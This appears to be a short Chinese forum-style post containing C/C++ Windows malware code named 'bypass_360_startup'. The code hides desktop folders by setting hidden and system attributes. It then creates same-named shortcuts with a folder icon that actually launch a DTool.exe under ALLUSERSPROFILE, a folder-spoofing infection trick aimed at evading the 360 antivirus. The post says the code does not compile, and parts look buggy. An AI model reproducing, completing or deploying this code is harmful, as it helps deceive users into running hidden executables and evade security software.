并不能够编译运行

需要改动

```c
int bypass_360_startup()
{
	TCHAR str_desktop[256];
	LPITEMIDLIST pidl;
	SHGetSpecialFolderLocation(NULL, CSIDL_DESKTOP, &pidl);//place the shortcut on the desktop  
	SHGetPathFromIDList(pidl, str_desktop);
 
	if (if_need_infection(str_desktop) == 0)//是否需要感染  
	{
		OutputDebugStringA("bypass_360_startup if_need_infection return");
		return 0;
	}
 
	if (set_hide_directory(str_desktop) == 0)//设置目录为隐藏属性  
	{
		OutputDebugStringA("bypass_360_startup set_hide_directory return");
		return 0;
	}
 
	if (create_link(str_desktop) == 0)//创建同名的快捷方式  
	{
		OutputDebugStringA("bypass_360_startup create_link return");
		return 0;
	}
 
	return 0;
}
 
 
int if_need_infection(TCHAR str_disk[])
{
	OutputDebugStringA("if_need_infection fun:");
	CSearchFile file;
 
	file.SearchFile(_T("."), str_disk);
 
	for (DWORD i = 0; i<file.MyVectorFile.size(); i++)
	{
		OutputDebugString(file.MyVectorFile[i].szFilePath);
	}
 
	if (file.MyVectorFile.size()>0)
	{
		return 1;
	}
 
	return 0;
}
 
 
int set_hide_directory(TCHAR str_disk[])
{
	OutputDebugStringA("set_hide_directory fun:");
	CSearchFile file;
 
	file.SearchFile(_T("."), str_disk);
 
	for (DWORD i = 0; i < file.MyVectorFile.size(); i++)
	{
		SetFileAttributes(file.MyVectorFile[i].szFilePath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);//设置隐藏属性  
		OutputDebugString(file.MyVectorFile[i].szFilePath);
	}
 
	return 1;
}
 
int create_link(TCHAR str_disk[])
{
	OutputDebugStringA("create_link fun:");
	CSearchFile file;
 
	file.SearchFile(_T("."), str_disk);
 
	for (DWORD i = 0; i < file.MyVectorFile.size(); i++)
	{
		TCHAR str_all_user_path[MAX_PATH] = { 0 };
		TCHAR str_exe_path[MAX_PATH] = { 0 };//DTool.exe的路径  
		GetEnvironmentVariable(_T("ALLUSERSPROFILE"), str_all_user_path, MAX_PATH);
		_stprintf(str_exe_path, _T("%s\\updata\\DTool.exe"), str_all_user_path);
 
		TCHAR path_buffer[_MAX_PATH];
		_stprintf(path_buffer, _T("%s.lnk"), file.MyVectorFile[i].szFilePath);
		//OutputDebugString(path_buffer);  
		CreateLinkThenChangeIcon(str_exe_path, path_buffer);
	}
 
	return 1;
 
}
 
void CreateLinkThenChangeIcon(LPTSTR fname_to_create_link,
	LPTSTR lnk_fname)
{
	CoInitialize(0);
 
	HRESULT hres;
	IShellLink *psl = NULL;
	IPersistFile *pPf = NULL;
	WCHAR wsz[256];
	TCHAR buf[256];
	int id;
	LPITEMIDLIST pidl;
 
	hres = CoCreateInstance(CLSID_ShellLink,
 
		NULL,
		CLSCTX_INPROC_SERVER,
		IID_IShellLink,
		(LPVOID*)&psl);
	if (FAILED(hres))
		goto cleanup;
	hres = psl->QueryInterface(IID_IPersistFile, (LPVOID*)&pPf);
	if (FAILED(hres))
		goto cleanup;
	hres = psl->SetPath(fname_to_create_link);
	if (FAILED(hres))
 
		goto cleanup;
	//place the shortcut on the desktop  
 
	SHGetSpecialFolderLocation(NULL, CSIDL_DESKTOP, &pidl);//创建到桌面s  
 
	SHGetPathFromIDList(pidl, buf);
 
	lstrcat(buf, _T("\\"));
	lstrcat(buf, lnk_fname);
 
#ifdef UNICODE  
	hres = pPf->Save(buf, TRUE);
#else  
	MultiByteToWideChar(CP_ACP, 0, lnk_fname, -1, wsz, MAX_PATH);//这里lnk_fname给的是全路径  
	hres = pPf->Save(wsz, TRUE);
#endif  
 
	if (FAILED(hres))
 
		goto cleanup;
 
	GetSystemDirectory(buf, 256);
 
	lstrcat(buf, _T("\\shell32.dll"));
 
	hres = psl->SetIconLocation(buf, 3);//15在shell32.dll中是我的电脑图标,220为IE图标,3为文件夹  
 
	if (FAILED(hres))
 
		goto cleanup;
 
	hres = psl->GetIconLocation(buf, 256, &id);
 
	if (FAILED(hres))
 
		goto cleanup;
 
	pPf->Save(wsz, TRUE);
 
cleanup:
 
	if (pPf)
 
		pPf->Release();
 
	if (psl)
 
		psl->Release();
 
	CoUninitialize();
}
```

